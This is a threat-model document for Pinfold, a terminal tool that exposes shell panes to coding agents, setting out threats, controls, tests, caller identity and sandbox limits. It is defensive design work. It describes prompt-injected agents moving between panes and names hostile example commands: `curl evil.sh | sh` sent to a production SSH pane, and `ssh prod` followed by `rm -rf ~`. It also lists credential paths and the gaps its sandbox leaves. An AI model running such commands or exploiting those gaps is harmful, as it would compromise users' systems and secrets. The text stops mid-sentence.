# Threat model

This document is the source of truth for Pinfold's security design. It restates the
Security design section of [`architecture.md`](architecture.md) as amended by review
finding B1 in [`architecture-review.md`](architecture-review.md) and by
[ADR-0004](../adr/0004-agent-identity-from-pty.md),
[ADR-0010](../adr/0010-security-model.md),
[ADR-0020](../adr/0020-identity-hardening.md),
[ADR-0028](../adr/0028-windows-are-spawned-by-the-core.md) and
[ADR-0046](../adr/0046-agent-panes-read-needs-you-from-output.md). Bearer tokens, `PINFOLD_TOKEN` and the
owner token no longer exist, whatever older text says.

**Status: partly built.** The sections below are the design. Many of its controls are
built, and [Controls and their tests](#controls-and-their-tests) says which, where, and
which test covers each. Where a number in the design differs from the code, the code and
that table are right.

## The honest summary

Pinfold gives coding agents a programmable channel into your shells. Agents act on
untrusted text, so a prompt-injected agent could try to type into your production SSH
session from another pane.

**The API controls are guardrails, not a security boundary.** An unsandboxed agent runs
as your user. It can read your files, edit your config, and use its own shell instead
of the API. The controls here stop injected instructions that use Pinfold's API, and
they make misuse visible. **Only a sandboxed agent is contained**: in what it writes, which terminals it
reaches, and the credential stores, secret-looking variables and direct clipboard access it
is denied. It
can still read your other files and reach the network, and on macOS read your other
processes' environment (see Sandbox below).

## What we protect

| Asset                                     | Why it matters                                                                |
| ----------------------------------------- | ----------------------------------------------------------------------------- |
| Shell sessions                            | Each runs with your full user rights, and some are root or production SSH     |
| Scrollback and screen contents            | Often hold secrets: tokens printed by CLIs, `.env` files, connection strings  |
| Clipboard                                 | Holds passwords and keys; writable by escape sequences                        |
| Session snapshots, spill files, audit log | Secrets at rest on disk                                                       |
| Config, hooks, plugins, agent profiles    | They define what runs, so tampering with them means code execution            |
| Webhook and notification channels         | The only ways data leaves the machine                                         |

## Scope

- **In scope:** the threats below, and escape from a sandboxed agent profile.
- **Not defended:** actions an unsandboxed agent takes with its own user rights outside
  the API. Pinfold reduces the damage of these (window confirmation of config changes,
  a tamper-evident audit log) but cannot prevent them. In particular, without a sandbox
  Pinfold cannot stop same-user ptrace of another pane's processes, where the OS allows
  it, or writes to another pane's terminal. Those writes reach that pane's VT parser as
  program output, not its input.
- **Out of scope:** root and kernel compromise.

## Threats

| #   | Threat                                                   | Example                                                                                            | Primary control                                                                                                |
| --- | -------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| T1  | A prompt-injected agent moves sideways to another pane   | Agent in pane 3 sends `curl evil.sh \| sh` to your prod SSH pane                                   | PTY-derived identity; scopes; approval prompt; protected panes; sends split at newlines                        |
| T2  | An agent reads secrets from other panes                  | `pane.read` on a pane that just ran `cat .env`                                                     | Read of other panes needs approval; secret redaction                                                           |
| T3  | Hostile program output abuses escape sequences           | Title-report sequence echoes attacker text into the shell's input; OSC 52 reads the clipboard      | Reply sequences disabled; clipboard read off; length limits                                                    |
| T4  | Spoofed status or alerts                                 | Output prints a fake OSC 133 "done", or floods OSC 9 notifications                                 | Output-reported status labelled as such; API status from a PTY-identified caller outranks it; only agent-profile panes read "needs you" from output (ADR-0046); rate limits |
| T5  | Malicious repo content                                   | `.pinfold/layout.toml` runs commands on `pinfold up`; `git diff` runs a hostile `core.fsmonitor`   | Workspace trust prompt; hardened git invocation                                                                |
| T6  | Hostile files in the built-in tools                      | Escape bytes or Trojan Source bidi characters in a filename; a file that stalls the parser         | Control and bidi characters shown escaped; size and time caps; each tool is its own process in its own pane    |
| T7  | Paste injection                                          | Pasted text containing `ESC[201~` ends bracketed paste early and runs the rest                     | Strip paste terminators and control characters; multi-line paste warning                                       |
| T8  | Another local user or a sandboxed app reaches the socket | Shared host; Flatpak app with a socket portal                                                      | 0700 directory, 0600 socket, peer UID check, PTY-derived identity                                              |
| T9  | Secrets leak at rest or over the network                 | Snapshot with scrollback copied off the disk; webhook carries output                               | Scrollback snapshots off by default and redacted; spill files, once they exist, under an in-memory key; webhooks carry status only |
| T10 | Parser bugs or supply-chain compromise                   | Crafted output crashes the VT parser; a bad crate update                                           | `unsafe` only in `pinfold-sys`; fuzzing; `cargo-deny`, `cargo-vet`; signed releases; core isolated from the UI |

Each threat needs at least one test proving its control works.

## Controls and their tests

What is built today. Tests are named by function. A control not built, or one no CI test can
check, names the issue that builds or tests it. Paths are under `crates/` unless they start
with a top-level folder.

| #   | Control                                     | Implemented in                                                                | Test                                                                                                                                    |
| --- | ------------------------------------------- | ----------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| T1  | PTY-derived identity                        | `pinfold-sys/src/lib.rs` (`peer_terminal`), `pinfold-core/src/io.rs`          | `a_caller_is_the_pane_whose_terminal_and_session_it_holds` (`pinfold-core/src/io.rs`)                                                   |
| T1  | Scopes: `self` and `children`               | `pinfold-cli/src/bin/pinfold-core.rs` (`decide`), `pinfold-core/src/family.rs` | `a_pane_spawns_children_and_reaches_only_them`, `a_pane_can_send_to_itself_and_cross_pane_send_needs_a_window` (`pinfold-cli/tests/session.rs`) |
| T1  | Approval prompt, 30-minute grants           | `pinfold-core/src/grants.rs`, `pinfold-ui/src/approval.rs`                     | `only_the_window_answers_cross_pane_actions_and_ctl_revokes_grants` (`session.rs`), `a_grant_covers_one_triple_and_expires_after_thirty_minutes` (`grants.rs`), `keys_go_to_an_approval_and_a_held_one_answers_nothing`, `a_click_behind_an_approval_goes_nowhere`, `input_method_text_behind_a_prompt_goes_nowhere` (`window.rs`) |
| T1  | Owner changes outside panes ask, once       | `pinfold-cli/src/bin/pinfold-core.rs` (`owner_prompt`), `pinfold-core/src/grants.rs` | `owner_methods_from_a_new_terminal_in_a_pane_wait_for_the_window` (`session.rs`), `an_owner_prompt_is_its_own_and_grants_nothing_lasting` (`grants.rs`) |
| T1  | Protected panes                             | `pinfold-core/src/protect.rs`, `pinfold-sys/src/foreground.rs`                 | `echo_off_patterns_and_marks_refuse_a_send` (`protect.rs`), `a_configured_protect_pattern_refuses_a_send_to_a_pane_that_runs_it` (`session.rs`) |
| T1  | Sends split at newlines                     | `pinfold-core/src/protect.rs`                                                 | `a_second_line_never_lands_in_ssh` (`protect.rs`)                                                                                       |
| T1  | `pane.send` limits: 4 KB, 20 per second     | `pinfold-api/src/control.rs` (`MAX_SEND`), `pinfold-core/src/io.rs`            | `a_send_over_4096_bytes_is_refused_whole` (`control.rs`), `sends_past_20_a_second_or_a_full_queue_are_refused` (`io.rs`)                |
| T1  | Audit log, hash-chained                     | `pinfold-api/src/audit.rs`, `pinfold-cli/src/audit.rs`                         | `detects_changed_dropped_swapped_and_forged_lines`, `a_swapped_symlink_is_never_written_or_chmodded` (`pinfold-api/src/audit.rs`), `sends_are_audited_by_size_and_only_a_terminal_outside_a_pane_reads_the_log` (`pinfold-cli/tests/audit.rs`) |
| T2  | Cross-pane reads need approval and redact   | `pinfold-cli/src/bin/pinfold-core.rs` (`pane_action`), `pinfold-api/src/redact.rs` | `only_the_window_answers_cross_pane_actions_and_ctl_revokes_grants` (`session.rs`), `corpus_reports_detection_rates`, `a_read_cut_at_any_row_of_a_key_block_hides_the_rest_of_it` (`pinfold-api/tests/redact_corpus.rs`) |
| T3  | Only fixed-format replies                   | `pinfold-core/src/vt.rs`                                                      | `sequences_that_echo_strings_get_no_reply`, `replies_are_only_fixed_format_csi`, `any_bytes_split_and_resized_keep_the_grid_and_replies_bounded` (`vt.rs`) |
| T3  | OSC 52: no read, and writes are refused     | `pinfold-core/src/vt.rs`, `pinfold-ui/src/flash.rs`                            | `a_clipboard_write_is_counted_and_never_answered` (`vt.rs`), `only_a_copy_asked_for_can_reach_the_clipboard` (`pinfold-ui/src/link.rs`) |
| T3  | OSC 8 targets shown, non-web schemes ask    | `pinfold-ui/src/hyperlink.rs`                                                 | `web_links_open_and_other_schemes_ask`, `the_prompt_shows_the_whole_uri_escaped` (`hyperlink.rs`)                                       |
| T3  | Length caps on strings, titles, hyperlinks  | `pinfold-core/src/vt.rs`                                                      | `an_unending_osc_string_stops_at_the_limit` (`vt.rs`), `long_titles_are_cut_at_a_character`, `hyperlinks_stop_at_the_limit_and_return_when_they_scroll_away` (`pinfold-core/tests/escape_policy.rs`) |
| T3  | OSC 7 cwd is a hint: no `..`, and a directory is checked before use | `pinfold-core/src/marks.rs` (`working_directory`), `pinfold-core/src/snapshot.rs` (`start_in`), `pinfold-core/src/sandbox.rs` | `malformed_directories_keep_the_last_good_one` (`pinfold-core/tests/shell_marks.rs`), `only_a_directory_no_one_else_can_write_or_redirect_is_kept` (`snapshot.rs`), `a_working_directory_must_be_a_private_project` (`sandbox.rs`) |
| T3  | Scrollback capped at 2 MB per pane          | `pinfold-core/src/scrollback.rs` (`BYTE_CAP`)                                 | `hostile_output_through_a_pane_stays_under_the_cap` (`vt.rs`)                                                                           |
| T4  | API status outranks OSC 133 marks           | `pinfold-core/src/status.rs`, `pinfold-core/src/marks.rs`                      | `api_outranks_output_until_cleared`, `a_fake_error_from_output_does_not_silence_an_api_alert` (`status.rs`)                             |
| T4  | Status alerts rate-limited                  | `pinfold-core/src/status.rs`                                                  | `flapping_needs_you_fifty_times_in_one_second_raises_one_alert` (`status.rs`)                                                           |
| T4  | OSC 133 marks stay in their pane, never say "needs you" or alert | `pinfold-core/src/status.rs` (`observe_shell`), `pinfold-core/src/io.rs` | `spoofed_marks_stay_in_their_pane_and_never_say_needs_you` (`io.rs`) |
| T4  | OSC 7501 states and OSC 9 say "needs you" only in an agent profile's pane, labelled as from output; a plain shell pane printing the same bytes never does (ADR-0046) | `pinfold-core/src/status.rs` (`observe_agent`), `pinfold-core/src/io.rs` (`read_agent_signals`), `pinfold-cli/src/bin/pinfold-core.rs` (`agent.launch`) | `agent_signals_say_needs_you_only_in_an_agent_profiles_pane` (`io.rs`), `a_shell_pane_never_needs_you_from_output_and_a_report_outranks_an_agent` (`status.rs`), `recorded_agent_sessions_show_the_expected_statuses` (`pinfold-core/tests/agent_sessions.rs`: `codex.rec` in a plain pane never shows needs you) |
| T4  | Needs you from output clears on the CLI's next state, its command's end, or typing | `pinfold-core/src/status.rs` (`observe_agent`, `typed`), `pinfold-core/src/link.rs` (`note_input`) | `an_agent_pane_needs_you_until_its_cli_moves_on_or_the_person_types` (`status.rs`) |
| T4  | OSC 9 and 777 text never shown; their alerts rate-limited | The parser drops both and the core keeps no text, only a count of OSC 9. An agent pane's needs you alerts once per pane per 10 s | `a_flood_of_osc_9_and_777_notifications_only_moves_a_counter` (`vt.rs`), `a_flapping_agent_cli_raises_one_alert_in_ten_seconds` (`status.rs`) |
| T4  | Window notifications: PinFold's text, one per tab per 60 s and one per 10 s in all | `pinfold-ui/src/notify.rs`, `pinfold-sys/src/notify.rs` (macOS; Linux has the tab mark only) | `a_flood_of_needs_you_notifies_once_a_tab_a_minute_and_once_in_ten_seconds`, `the_text_is_pinfolds_own`, `only_a_tab_that_just_needs_you_unseen_is_due` (`pinfold-ui/src/notify.rs`) |
| T4  | A new tab or split starts in the source shell's directory from the system, never OSC 7 | `pinfold-core/src/io.rs` (`shell_from`), `pinfold-core/src/tabs.rs` | `a_split_or_tab_starts_where_the_shell_is_not_where_osc_7_says` (`pinfold-core/src/link.rs`) |
| T5  | Workspace trust prompt                      | `pinfold-api/src/trust.rs`, `pinfold-core/src/grants.rs`, `pinfold-config/src/workspace.rs` | `only_the_window_answers_a_trust_prompt_and_trusting_records_the_layout`, `up_runs_a_trusted_workspace_and_a_restore_runs_it_again_until_its_file_changes` (`session.rs`) |
| T1  | `pane.send` to a tool pane is refused for every caller, before any prompt (ADR-0045) | `pinfold-core/src/io.rs` (`send`), `pinfold-core/src/tool.rs` (`NO_SEND`), `pinfold-cli/src/bin/pinfold-core.rs` (`decide`) | `a_tool_pane_is_listed_as_one_and_refuses_every_send` (`pinfold-core/src/tool.rs`), `an_agent_cannot_type_into_the_tool_it_opened` (`session.rs`) |
| T6  | `tool.open` runs the sibling `pinfold` with a fixed argument list and the caller's values after `--`; `path` and `range` are checked before a process starts | `pinfold-api/src/tool.rs` (`params`, `revision`), `pinfold-core/src/tool.rs` (`command`), `pinfold-cli/src/bin/pinfold-core.rs` (`sibling`) | `a_range_is_revision_characters_and_one_separator_at_most`, `a_path_must_be_absolute_and_bounded`, `only_diff_takes_staged_and_range` (`pinfold-api/src/tool.rs`), `a_path_of_the_wrong_kind_starts_nothing` (`pinfold-core/src/tool.rs`), `an_agent_cannot_type_into_the_tool_it_opened` (`session.rs`) |
| T6  | A tool pane's tab title is the tool and its argument with control and bidi characters escaped; a saved tool runs again only if it passes `tool.open`'s checks, else a shell does | `pinfold-core/src/tool.rs` (`title`), `pinfold-ui/src/top_bar.rs` (`label`), `pinfold-core/src/snapshot.rs` (`restore`) | `a_title_escapes_every_control_and_bidi_character` (`pinfold-core/src/tool.rs`), `a_tool_panes_title_is_shown_whole_and_still_filtered` (`top_bar.rs`), `a_tool_pane_runs_the_same_tool_again_and_a_bad_one_a_shell` (`snapshot.rs`) |
| T5  | Hardened git invocation: every git call from a built-in tool goes through `git::run`, which clears inherited `GIT_*` variables, finds git on an absolute `PATH` entry, passes `--no-pager` and `-c` overrides for `core.fsmonitor`, `core.hooksPath`, `core.pager`, `core.sshCommand`, `core.askPass`, `credential.helper` and every transport, empties each filter command the configuration names, gives `diff` `--no-ext-diff --no-textconv`, and never looks inside a submodule | `pinfold-tools/src/git.rs` (`run`, `find`, `OVERRIDES`, `overrides`) | `nothing_a_hostile_repository_configures_runs` (`pinfold-tools/tests/hostile_repo.rs`), `no_other_file_in_the_crate_starts_a_process`, `git_is_found_only_through_absolute_path_entries`, `every_git_variable_is_dropped` (`git.rs`) |
| T6  | The markdown reader escapes file content and reads at most 5 MB, then shows it as plain text under a banner; parsing stops after 2 s, laid-out lines after 100,000 and a line after 10,000 characters; the outline keeps 10,000 escaped headings and a search, escaped like the text, 10,000 matches; a followed link opens only as a relative or `file:` path, read the same capped, non-blocking way, and any other target is shown escaped, never run; follow mode re-reads the same way on a changed modification time, length or inode (ADR-0045) | `pinfold-tools/src/md.rs` (`read`, `layout`, `MAX_BYTES`, `MAX_PARSE`, `MAX_LINES`, `MAX_LINE`, `MAX_HEADINGS`, `MAX_MATCHES`, `MAX_BACK`, `local`, `tick`), `pinfold-tools/src/screen.rs` (`escape`) | `a_file_is_read_up_to_the_byte_cap_and_no_further`, `the_start_of_a_file_over_the_byte_cap_shows_as_plain_text_under_a_banner`, `past_the_time_cap_the_rest_shows_as_plain_text`, `lines_past_the_line_cap_are_dropped`, `a_line_past_the_length_cap_is_cut`, `the_outline_and_search_stop_at_their_caps`, `relative_and_file_links_are_files_and_others_are_not`, `a_link_opens_in_the_reader_and_backspace_goes_back`, `backspace_remembers_at_most_its_cap_of_files`, `follow_mode_reads_a_changed_file_again_and_keeps_the_place`, `each_escape_in_file_content_shows_escaped_as_markdown_and_as_plain_text`, `a_bidi_file_name` (`md.rs`); fuzz target `markdown` |
| T6  | The diff viewer runs `git diff` only through `git::run`, with fixed `a/` and `b/` prefixes; its parser takes any bytes without panicking and keeps at most 10,000 files, 100,000 hunks, 500,000 lines and 10,000 bytes a line, with a banner for each cap and for git cut short at 8 MB or 10 s; every path and line is escaped (ADR-0045) | `pinfold-tools/src/diff.rs` (`load`, `parse`, `MAX_FILES`, `MAX_HUNKS`, `MAX_LINES`, `MAX_LINE`) | `past_the_file_cap_the_rest_is_dropped`, `past_the_hunk_cap_the_rest_is_dropped`, `past_the_line_cap_the_rest_is_dropped`, `a_line_past_the_length_cap_is_cut_at_a_character`, `a_diff_cut_anywhere_parses_what_is_there`, `a_hostile_path_and_line_show_escaped`, `a_cut_short_diff`, `git_diff_runs_through_git_run_and_says_why_it_failed_or_was_cut_short` (`diff.rs`); fuzz target `unified_diff` |
| T6  | The file manager escapes every name and previewed byte, previews at most 64 KiB (4 KiB in hex), lists at most 10,000 entries per directory, never opens a FIFO, device or socket, and opens executables in the reader rather than running them; a name holding a control or bidi character (U+202A-202E, U+2066-2069, U+200E, U+200F, U+061C, C0, C1, DEL) or invalid UTF-8 is flagged red, and entries past the cap are counted on screen (ADR-0045, [#318](https://github.com/0xPiranhaCodes/pinfold.sh/issues/318)) | `pinfold-tools/src/files.rs` (`list`, `preview`, `flagged`, `column`, `MAX_ENTRIES`, `MAX_PREVIEW`, `MAX_HEX`), `pinfold-tools/src/md.rs` (`read_at_most`), `pinfold-tools/src/screen.rs` (`escape`) | `an_escaped_name`, `a_newline_an_esc_and_a_bidi_override_in_a_name_are_flagged`, `only_a_name_escape_changes_is_flagged`, `entries_past_the_cap_are_counted_on_screen`, `a_text_preview_reads_up_to_its_cap`, `a_hex_preview_shows_up_to_its_cap`, `a_fifo_is_neither_previewed_nor_opened`, `enter_on_an_executable_opens_it_in_the_reader_and_never_runs_it` (`files.rs`); the reader's caps and escapes from [#315](https://github.com/0xPiranhaCodes/pinfold.sh/issues/315): `a_file_is_read_up_to_the_byte_cap_and_no_further`, `the_start_of_a_file_over_the_byte_cap_shows_as_plain_text_under_a_banner`, `past_the_time_cap_the_rest_shows_as_plain_text`, `lines_past_the_line_cap_are_dropped`, `a_line_past_the_length_cap_is_cut`, `each_escape_in_file_content_shows_escaped_as_markdown_and_as_plain_text` (`md.rs`); closes [#263](https://github.com/0xPiranhaCodes/pinfold.sh/issues/263) |
| T5, T6 | The file manager's badges come from `git status --porcelain=v1 -z --ignored`, run only through `git::run` and only inside a repository found by its `.git`, on its own thread and killed after 2 s, after which that directory gets no more calls until it is left; NUL-separated output parses a name holding a newline, a quote or a rename's second path as it is; the directory and the index are compared once a second and git reruns only on a change, one call at a time (ADR-0045, [#319](https://github.com/0xPiranhaCodes/pinfold.sh/issues/319)) | `pinfold-tools/src/files.rs` (`badges`, `repository`, `status`, `poll`, `STATUS_TIMEOUT`, `POLL`), `pinfold-tools/src/git.rs` (`run_within`) | `each_badge_from_a_scratch_repository`, `hostile_status_output_parses_as_it_is`, `git_status_over_its_cap_leaves_a_note_and_no_more_calls`, `a_file_added_shows_after_the_next_check_with_its_badge` (`files.rs`), `a_call_is_killed_at_its_deadline` (`git.rs`) |
| T7  | Paste sanitizer                             | `pinfold-core/src/paste.rs`                                                   | `a_paste_cannot_end_its_brackets`, `control_characters_are_stripped` (`paste.rs`); fuzz target `paste`                                  |
| T7  | Multi-line paste warning                    | `pinfold-ui/src/paste.rs`                                                     | `any_line_end_asks_first`, `risky_commands_are_named` (`pinfold-ui/src/paste.rs`)                                                       |
| T7  | Clipboard reads stop at the 1 MiB paste limit, so another program's clipboard cannot grow the window | `pinfold-sys/src/clipboard.rs` (`bounded` on macOS), `pinfold-sys/src/clipboard/x11.rs`, `vendor/smithay-clipboard.patch` (Wayland), `pinfold-ui/src/window.rs` (`paste`) | `a_clipboard_over_the_limit_is_refused_in_bytes`, `a_large_clipboard_costs_this_process_the_limit` (`pinfold-sys/src/clipboard.rs`, macOS), `a_large_x11_clipboard_is_refused_and_a_small_one_read`, `chunks_add_up_to_the_limit_and_no_further` (`clipboard/x11.rs`), `a_wayland_offer_past_the_limit_is_too_large` (`clipboard.rs`; no automated Wayland compositor test, [#310](https://github.com/0xPiranhaCodes/pinfold.sh/issues/310)) |
| T8  | 0700 directory, 0600 socket, no symlink     | `pinfold-api/src/control.rs`                                                  | `a_symlink_or_open_directory_is_refused` (`control.rs`)                                                                                 |
| T8  | Peer UID check                              | `pinfold-api/src/control.rs` (`accept`, `check_peer`)                         | Launcher side: `a_launcher_says_nothing_to_another_users_socket`. Core side: `the_core_closes_another_users_connection_unread` (`control.rs`) |
| T8  | Core hardening                              | `pinfold-sys/src/lib.rs`                                                      | `hardening_closes_the_core_and_leaves_its_panes_open` (`session.rs`); `tests/hardening/audit.sh` by hand                                 |
| T9  | Snapshots hold no scrollback, redacted      | `pinfold-core/src/snapshot.rs`                                                | `the_file_is_0600_in_a_0700_directory_and_holds_no_secret`, `a_command_is_redacted_and_capped_and_a_long_cwd_dropped` (`snapshot.rs`)   |
| T9  | Spill files and webhooks                    | Not built: cold scrollback stays in memory, and no webhook exists              | [#264](https://github.com/0xPiranhaCodes/pinfold.sh/issues/264) |
| T10 | `unsafe` only in `pinfold-sys`              | `Cargo.toml` (`unsafe_code = "forbid"`), `pinfold-sys/Cargo.toml`             | The compiler refuses `unsafe` elsewhere, in every build                                                                                 |
| T10 | Fuzzing                                     | `fuzz/fuzz_targets/` (11 targets)                                             | `cargo xtask fuzz-smoke` in `.github/workflows/ci.yml`, 30 minutes each in `nightly.yml`                                                |
| T10 | `cargo-deny`, `cargo-vet`                   | `deny.toml`, `supply-chain/`                                                  | `.github/workflows/ci.yml`                                                                                                              |
| T10 | Signed releases                             | `packaging/macos/bundle.sh` (hardened runtime)                                | Needs the Developer ID: [#212](https://github.com/0xPiranhaCodes/pinfold.sh/issues/212) |
| T10 | Core isolated from the window               | `pinfold-cli/src/bin/pinfold-window.rs`, `pinfold-sys/src/socket.rs`          | `a_session_outlives_its_client_and_says_when_the_core_dies` (`session.rs`)                                                              |

## Trust boundaries

`pinfold-core` is the trusted code. The window process hosts rendering, and it can crash or
restart without touching a PTY. The built-in tools are programs the core starts in their
own pane ([ADR-0045](../adr/0045-tools-are-programs-in-their-own-pane.md)), so their output
is program output, and `pane.send` to a tool pane is refused for every API caller. Four kinds of input cross
into the core:

- **API callers** are identified from their PTY, never from something they present.
- **Program output** passes the escape-sequence filter, and only changes what is drawn.
- **Pastes and files** pass sanitizers, and never become keystrokes on their own.
- **Window messages** come only over a link the core made, and cannot panic it.

## Caller identity

1. **Peer check.** The core accepts a connection only if the peer's UID matches its own.
   The socket directory is 0700 and the socket 0600. The core refuses to start if the
   directory is a symlink or owned by someone else.
2. **PTY mapping.** The core reads the peer's pid (`SO_PEERCRED` on Linux,
   `LOCAL_PEERPID` on macOS), finds its controlling terminal and session, and maps that
   to a pane. A caller must hold the pane's terminal and be in its session. On Linux,
   `SO_PEERPIDFD` guards this lookup against pid reuse. A pane's environment holds no credential, so reading another pane's
   environment gives nothing. The pair is read once, at accept, and mapped to a pane on each
   request, so a pane that closes stops matching.

   macOS does not use `LOCAL_PEERTOKEN`. Its audit token carries the pid version, but no
   public call checks a running process against it or reads a terminal by it, so it cannot
   close the race. macOS, like Linux before 6.5, keeps the window from `connect` to the lookup
   at accept: a caller that exits there and whose pid then goes to a process in another pane's
   session would be taken for that pane. The caller cannot choose which process gets its pid.
3. **No terminal.** A caller with no controlling terminal is unidentified and gets no
   pane scopes. An MCP server must stay in its agent's session.
4. **Outside a pane.** No token exists on disk. A pane's program can start a terminal of
   its own, such as `script`'s, so a caller outside every pane may not be a person. A change
   it asks for, `session.save`, `workspace.open` or `grants.revoke`, needs a one-time
   confirmation drawn in the Pinfold window ([ADR-0042](../adr/0042-owner-changes-ask-in-the-window.md)).
   Reads of grants, audit and trust state return no pane text and are not asked.

5. **Window link.** A window can read and write every pane, so it never connects by name.
   The core makes a socketpair and starts the window itself, and that inherited descriptor
   is the only way in ([ADR-0028](../adr/0028-windows-are-spawned-by-the-core.md)). A caller
   on the control socket can ask for a window to open, with no arguments, and gets no channel
   into a pane. The window sets the same hardening as the core.
6. **Core hardening.** Before opening any PTY, the core sets `PR_SET_DUMPABLE(0)` on Linux
   and `PT_DENY_ATTACH` on macOS. Neither reaches a pane: `exec` clears both, so you can
   debug your own programs in a pane. What each stops was measured with
   [`tests/hardening/audit.sh`](../../tests/hardening/audit.sh), and
   `crates/pinfold-cli/tests/session.rs` fails if the core or a pane changes side.

   | Same-user attempt on the core                  | Linux    | macOS, plain build              | macOS, hardened runtime |
   | ---------------------------------------------- | -------- | ------------------------------- | ----------------------- |
   | `ptrace` attach                                | Refused  | Refused, attacker gets SIGSEGV  | Refused, same           |
   | Copy a PTY master (`pidfd_getfd`)              | Refused  | No such call                    | No such call            |
   | Task port, signed with the debugger entitlement | No such call | **Granted: memory was read** | Refused                 |
   | Apple's `vmmap` and `leaks`                    | No such tool | Work: region and heap sizes | Work: same              |

   A plain macOS build is therefore not safe from a same-user process that can ad-hoc sign a
   program, which needs no admin rights and no Developer Mode. That task port reads the core's
   memory, and a task port normally allows writes too, which was not tried. `PinFold.app` is
   signed with the hardened runtime for this reason. A `cargo` build is not, so its core says
   so ([ADR-0044](../adr/0044-cores-without-the-hardened-runtime-warn.md)): at start it reads its
   own flags with `csops`, logs `hardened_runtime=no` at warn, and the window shows a notice
   with the command that signs the build and keeps `▲ unhardened` in the tab row for the
   session. A failed check says `unchecked` instead. Refusing the session was not chosen, as
   same-user `ptrace` of pane programs stays open without a sandbox. To sign a source build,
   with no Apple account:

   ```sh
   codesign --force --sign - --options runtime target/release/pinfold-core target/release/pinfold-window
   ```

   These stay open on purpose. `pinfold-core --idle <panes>` and `--window` skip hardening so
   that the core can be measured and debugged, and any same-user process can run them. If one
   owns the socket, `pinfold` uses it. That gives an attacker nothing new, as a same-user
   process could equally start its own program there and the launcher checks only the owner. A
   core started under a tracer stays traced on Linux, where the tracer keeps its registers but
   loses its memory reads, and exits with status 45 on macOS. Apple's tools read sizes, and
   `gcore` was refused and a `leaks` memory graph did not hold a marker printed in a pane.

The [M0 spike](../spikes/m0-caller-identity/README.md) showed on Linux and macOS that a
process in pane A was never identified as pane B through the API, even with pane B's full
environment.

### Still open

- How sandboxed agents block TIOCSTI while staying in their pane's session, tested with
  real bubblewrap and `sandbox-exec`.

## Authorization

An agent fully controls the panes it created. Anything else needs a grant from you.

| Scope                   | Default for an agent pane | Covers                                                    |
| ----------------------- | ------------------------- | --------------------------------------------------------- |
| `self`                  | Granted                   | Read, send to and set status on its own pane              |
| `spawn`                 | Granted                   | Create panes; the agent then has full control of them     |
| `children`              | Granted                   | Read, send, wait on and close panes it spawned            |
| `notify`                | Granted (rate-limited)    | Raise alerts about its own panes                          |
| `tool.open`             | Granted                   | Open md, files or diff for you to see                     |
| `pane.read:other`       | Asks you                  | Read any pane it did not create                           |
| `pane.send:other`       | Asks you                  | Type into any pane it did not create                      |
| `session.*`             | Denied                    | Save, restore or kill sessions                            |
| `config.*`, `webhook.*` | Never over the API        | Changing config or alert destinations is config-file only |

**Approval.** A cross-pane action raises a prompt drawn by the window, outside pane text.
It shows the caller, target, action and the exact text to be sent. Only your keyboard
can answer it. Grants apply to one caller, target and action, and expire after 30
minutes (review finding M5). Related prompts are batched to reduce click-through.

**Protected panes** refuse API writes even with a grant. A pane is protected when:

- its foreground process matches a rule by name (`ssh`, `sudo`, `su`, `doas`, `mosh`,
  and others you add) or by command-line pattern (for `kubectl exec`, `docker exec`,
  `psql` or `aws ssm`), or it runs as root
- a password prompt is active (the PTY has echo turned off)
- you marked it

You can unlock a protected pane for one action with a key press. Reads of protected
panes are redacted.

**Sends to other panes split at newlines.** The core re-checks the foreground process
and waits about 150 ms between lines, so `ssh prod\nrm -rf ~\n` cannot pass the check
on the first line and land in ssh on the second.

**Secret redaction.** Text returned for any pane other than the caller's own passes a
redaction filter, as does anything written to a snapshot. It replaces likely secrets
with `«redacted:kind»`.

**Security-relevant config changes** (approval policy, redaction, webhooks, auto-rerun)
do not apply on hot reload until you confirm a diff in the window. Files writable by
group or others, or not owned by you, are refused.

**Audit log.** Each API call is recorded with caller, method, target, scope and result
in a hash chain. The in-memory copy is the source of truth, because an agent running as
you can rewrite the file on disk. A hash chain cannot show that entries were cut from its
tail, since a shortened chain is still valid. The file is opened without following a symlink and kept
only if it is a regular file of yours, in a folder that is yours and writable by no one
else; its mode is set through the open file.

**Limits.** A request line over 32 KiB is rejected. `pane.send` is capped at 4 KB per call and
20 calls per second per caller, and reads at 2 MB per call. Cold scrollback is capped at 2
MB per pane by default, because hostile output can defeat a line limit.

**Sandbox.** An agent profile may set `sandbox`, which launches the agent under
bubblewrap or Landlock on Linux and `sandbox-exec` on macOS, or under the agent CLI's own
sandbox mode. The sandbox hides `~/.ssh`, `~/.config/pinfold`, `~/.local/state/pinfold`,
other users' panes and the common credential stores: `~/.aws`, `~/.azure`, `~/.docker`,
`~/.gnupg`, `~/.kube`, `~/.netrc`, `gcloud` and `gh` in the config directory, and browser
profiles (`pinfold_config::credential_stores`, [ADR-0041](../adr/0041-sandbox-hides-writes-not-secrets.md)).
Before exec it strips every variable whose name looks like a secret (`*_TOKEN`, `*_KEY`,
`*_SECRET`, `AWS_*` and similar, `sandbox::secret_name`) but those the profile's `keep_env`
names. It blocks direct access to the clipboard: macOS denies `mach-lookup` of the pasteboard services, and on
Linux the X11 and Wayland sockets and `~/.Xauthority` are out of reach and `DISPLAY`,
`WAYLAND_DISPLAY` and `XAUTHORITY` are unset. Below Landlock ABI 6 an X server's abstract
socket stays reachable (ADR-0038), so an X server that admits the user without a cookie still
serves the clipboard there. Tests in `crates/pinfold-core/tests/sandbox.rs` run the real `sandbox-exec` and bubblewrap
for each: `a_sandboxed_agent_cannot_read_credential_stores`,
`a_sandboxed_agent_gets_no_secret_variables_but_those_it_keeps` and
`a_sandboxed_agent_cannot_reach_the_clipboard`.

**What the sandbox does not hide.** The macOS profile starts from `(allow default)` and the
Linux one from `--ro-bind / /`, so a sandboxed agent can read any file you can outside the
hidden paths, such as a credential store not on the list. A secret in a variable whose name
matches no pattern, such as a password inside `DATABASE_URL`, reaches it. On macOS it can also
read the environment of your other processes that are not platform binaries, `pinfold-core`
and every pane's shell among them, through `sysctl(KERN_PROCARGS2)`, so stripping keeps a
secret only out of its own environment there. No sandbox rule stops that read without stopping
the agent's own programs: `(deny process-info* (target others))` and `sysctl-read` rules let it
through, and an unconditional `(deny process-info*)` stops `python3` from running
(`tests/macos/sandbox-procargs.sh`, [ADR-0047](../adr/0047-macos-sandbox-reads-other-processes-environment.md),
Proposed). Linux is not affected, as the agent has its own PID namespace and `/proc`. The
network is open: the agent can connect anywhere over TCP or UDP, so it can send what it reads
